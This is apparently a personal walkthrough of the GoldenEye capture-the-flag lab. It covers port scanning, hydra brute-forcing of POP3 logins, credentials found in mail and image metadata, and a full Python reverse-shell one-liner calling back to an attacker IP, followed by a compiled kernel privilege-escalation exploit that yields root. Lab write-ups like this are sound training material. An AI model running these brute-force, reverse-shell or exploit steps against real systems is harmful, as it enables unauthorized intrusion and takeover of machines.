This machine is a medium difficulty and is a more guide based challenge. Instead of showing the answers to the 50 question im just going to talk about the more relevant stuff...

scan the ports 
```bash
nmap -p- -T4-min-rate=10000 10.10.103.36

nmap -p- -T4-min-rate=10000 10.10.103.36           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 06:02 EDT
Stats: 0:05:14 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 51.02% done; ETC: 06:12 (0:05:01 remaining)
Nmap scan report for 10.10.103.36
Host is up (0.24s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
25/tcp    open  smtp
80/tcp    open  http
55006/tcp open  unknown
55007/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 729.98 seconds
```
Lets do a more specific scan
```bash
nmap -p 25,80,55006,55007 -sC -sV 10.10.103.36
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 06:15 EDT
Nmap scan report for 10.10.103.36
Host is up (0.26s latency).

PORT      STATE SERVICE  VERSION
25/tcp    open  smtp     Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2018-04-24T03:22:34
|_Not valid after:  2028-04-21T03:22:34
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
|_http-title: GoldenEye Primary Admin Server
|_http-server-header: Apache/2.4.7 (Ubuntu)
55006/tcp open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: CAPA UIDL SASL(PLAIN) USER PIPELINING TOP AUTH-RESP-CODE RESP-CODES
55007/tcp open  pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: SASL(PLAIN) USER RESP-CODES CAPA UIDL PIPELINING TOP AUTH-RESP-CODE STLS

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.96 seconds
```
The websites source reveals some interesting comments
```bash
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
```
And with cyberchef we can convert the password into InvincibleHack3r

Lets try to bruteforce the pop3 mail service
```bash
hydra -l boris -P /usr/share/wordlists/rockyou.txt -f 10.10.103.36 -s 55007 pop3
```
The password is secret1! now we can log in and see the mails
The guided ctf suggests that we try to bruteforce the other accounts we found in the emails..
```bash
hydra -l usernames.txt -P /usr/share/wordlists/fasttrack.txt -f 10.10.219.192 -s 55007 pop3 -t 16
```
We got natalyas password: bird and lets see if they have some interesting mail
```bash
retr 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 17C96454B1
        for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!
```
We are able to use these credentials to log into the moodle. Then we are instructed to search for another account which happens to be Dr Dork and we are going to bruteforce the login with the same exact method as before
```bash
hydra -l doak -P /usr/share/wordlists/fasttrack.txt -f 10.10.219.192 -s 55007 pop3
```
The password of dork is goat. Lets log in and see whats going on
```bash
telnet 10.10.219.192 55007                                                        
Trying 10.10.219.192...
Connected to 10.10.219.192.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
user dork
+OK
pass goat
-ERR [AUTH] Authentication failed.
pass goat
-ERR No username given.
user doak
+OK
pass goat
+OK Logged in.
list
+OK 1 messages:
1 606
.
retr 1
+OK 606 octets
Return-Path: <doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 97DC24549D
        for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: <20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!
```
We can now log into the moodle as the user Dr_Doak
there we could find a secret folder named "s3cret.txt".. very unique..
```bash
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
```
There we find and image and im quessing there is something hidden in the metadata...
```bash
exiftool for-007.jpg                                    
ExifTool Version Number         : 13.25
File Name                       : for-007.jpg
Directory                       : .
File Size                       : 15 kB
File Modification Date/Time     : 2025:07:23 11:35:26-04:00
File Access Date/Time           : 2025:07:23 11:35:26-04:00
File Inode Change Date/Time     : 2025:07:23 11:35:26-04:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
X Resolution                    : 300
Y Resolution                    : 300
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : eFdpbnRlcjE5OTV4IQ==
Make                            : GoldenEye
Resolution Unit                 : inches
Software                        : linux
Artist                          : For James
Y Cb Cr Positioning             : Centered
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
User Comment                    : For 007
Flashpix Version                : 0100
Image Width                     : 313
Image Height                    : 212
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 313x212
Megapixels                      : 0.066
```
The image description seems like a base64 encoded text..
```bash
echo eFdpbnRlcjE5OTV4IQ== | base64 -d
xWinter1995x!
```
Ok so we got the password for the admin now and can use it to put a reverse shell on the website and gain access to the machine...
We inject our code
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.25.159",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
``` 
and execute it.. Now we have a shell but lets transport linpeas over and run the scan..
```bash
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits               
Linux version 3.13.0-32-generic (buildd@kissel) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014
Distributor ID: Ubuntu
Description:    Ubuntu 14.04.1 LTS
Release:        14.04
Codename:       trusty
```
Apparently the linux kernel is exploitable and has a CVE for priv escalation..
https://www.exploit-db.com/exploits/37292
Ok we have ran the exploit and now we have root access.
```bash
www-data@ubuntu:/tmp$ cc 37292.c -o hack
37292.c:94:1: warning: control may reach end of non-void function [-Wreturn-type]
}
^
37292.c:106:12: warning: implicit declaration of function 'unshare' is invalid in C99                           
      [-Wimplicit-function-declaration]
        if(unshare(CLONE_NEWUSER) != 0)
           ^
37292.c:111:17: warning: implicit declaration of function 'clone' is invalid in C99                             
      [-Wimplicit-function-declaration]
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
                ^
37292.c:117:13: warning: implicit declaration of function 'waitpid' is invalid in C99                           
      [-Wimplicit-function-declaration]
            waitpid(pid, &status, 0);
            ^
37292.c:127:5: warning: implicit declaration of function 'wait' is invalid in C99                               
      [-Wimplicit-function-declaration]
    wait(NULL);
    ^
5 warnings generated.                                                                                           
www-data@ubuntu:/tmp$ ls -la
total 996
drwxrwxrwt  4 root     root       4096 Jul 23 10:12 .
drwxr-xr-x 22 root     root       4096 Apr 24  2018 ..
drwxrwxrwt  2 root     root       4096 Jul 23 09:11 .ICE-unix
drwxrwxrwt  2 root     root       4096 Jul 23 09:11 .X11-unix
-rwxrwxrwx  1 www-data www-data   5120 Jul 23 10:11 37292.c
-rwxrwxrwx  1 www-data www-data  13773 Jul 23 10:11 a.out
-rwxrwxrwx  1 www-data www-data  13773 Jul 23 10:12 hack
-rwxrwxrwx  1 www-data www-data 954437 May 31 21:38 linpeas.sh
-rw-------  1 www-data www-data      4 Jul 23 09:42 tinyspellk7muDC
www-data@ubuntu:/tmp$ ./ hack
bash: ./: Is a directory
www-data@ubuntu:/tmp$ ./hack 
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root
```
I was too lazy to find it manually so i
```bash
find / -name "*.txt" 2>/dev/null
/root/.flag.txt

cat /root/.flag.txt
Alec told me to place the codes here: 

568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/
```
Nice. It was difficult but the fact that it was guided was helpful. This was my first medium CTF and hopefully not the last
